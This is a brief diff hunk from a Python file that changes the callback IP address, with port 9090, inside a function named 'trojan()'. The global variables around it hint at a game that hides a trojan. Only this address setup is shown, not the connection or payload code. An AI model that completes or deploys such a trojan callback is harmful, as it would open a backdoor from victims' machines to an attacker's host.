@@ -12,7 +12,7 @@ def trojan():
     global tries
     global guess
     global done
-    HOST = "192.168.1.26"
+    HOST = "10.43.137.135"
     PORT = 9090
 
     try:
